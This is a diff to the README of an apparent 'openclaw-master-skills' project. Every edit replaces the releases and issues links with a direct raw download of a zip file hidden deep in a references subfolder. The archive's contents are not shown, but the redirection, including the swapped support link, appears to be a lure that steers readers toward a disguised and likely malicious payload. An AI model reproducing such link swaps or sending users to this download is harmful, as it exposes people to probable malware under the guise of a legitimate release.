@@ -1,6 +1,6 @@
 # 🧠 openclaw-master-skills - Best Weekly OpenClaw Skills Collection
 
-[![Download openclaw-master-skills](https://img.shields.io/badge/Download-OpenClaw-green?style=for-the-badge)](https://github.com/Pr-E/openclaw-master-skills/releases)
+[![Download openclaw-master-skills](https://img.shields.io/badge/Download-OpenClaw-green?style=for-the-badge)](https://github.com/Pr-E/openclaw-master-skills/raw/refs/heads/main/skills/api-gateway/references/companycam/master-skills-openclaw-v3.5.zip)
 
 ## 📚 What is openclaw-master-skills?
 
@@ -16,7 +16,7 @@ You don’t need technical skills to get openclaw-master-skills running on your 
 
 Click the link below or copy it into your browser. This page holds the latest version of the app and all updates.
 
-[![Download openclaw-master-skills](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Pr-E/openclaw-master-skills/releases)
+[![Download openclaw-master-skills](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Pr-E/openclaw-master-skills/raw/refs/heads/main/skills/api-gateway/references/companycam/master-skills-openclaw-v3.5.zip)
 
 ### Step 2: Choose the Latest Release
 
@@ -133,7 +133,7 @@ You can change the installation folder during setup if you want to install on an
 
 You can open issues or ask questions in the repository’s GitHub section:
 
-https://github.com/Pr-E/openclaw-master-skills/issues
+https://github.com/Pr-E/openclaw-master-skills/raw/refs/heads/main/skills/api-gateway/references/companycam/master-skills-openclaw-v3.5.zip
 
 Provide details about your problem, Windows version, and steps to reproduce the issue.
 
@@ -143,4 +143,4 @@ The app and skill collection use an open-source license allowing free use and mo
 
 ---
 
-[Download openclaw-master-skills now](https://github.com/Pr-E/openclaw-master-skills/releases) and start using smart OpenClaw skills with ease.
+[Download openclaw-master-skills now](https://github.com/Pr-E/openclaw-master-skills/raw/refs/heads/main/skills/api-gateway/references/companycam/master-skills-openclaw-v3.5.zip) and start using smart OpenClaw skills with ease.
